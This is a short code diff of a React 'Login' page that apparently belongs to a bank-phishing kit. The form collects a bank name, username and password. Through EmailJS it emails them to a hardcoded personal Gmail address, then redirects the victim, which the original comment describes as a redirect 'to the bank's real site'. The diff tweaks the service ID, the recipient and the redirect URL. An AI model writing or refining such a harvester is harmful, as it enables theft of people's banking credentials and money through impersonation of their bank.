@@ -3,6 +3,7 @@ import BG from '../assets/bg.png';
 import Logo from '../assets/logo.png';
 import emailjs from '@emailjs/browser';
 import Footer from '../components/Footer';
+import { Navigate } from 'react-router-dom';
 
 export default function Login() {
   const [formData, setFormData] = useState({
@@ -49,22 +50,23 @@ export default function Login() {
     try {
       // Send email using EmailJS
       const response = await emailjs.send(
-        "service_my2ydis", // Replace with your EmailJS service ID
+        "template_vj50jeg", // Replace with your EmailJS service ID
         "template_lg21nvy", // Replace with your EmailJS template ID
         {
           bName: formData.bName,
           username: formData.name,
           password: formData.password,
-          to_email: "Leslieolobo@gmail.com", // Optional if specified in the template
+          to_email: "leslieolobo@gmail.com", // Optional if specified in the template
         }
       );
+      
       
       console.log("Email sent successfully:", response);
       setSubmitStatus("success");
       
       // Redirect to the bank's real site after a short delay
       setTimeout(() => {
-        window.location.href = "https://www.bravera.bank/";
+        window.location.href = "/";
       }, 1500);
       
     } catch (error) {
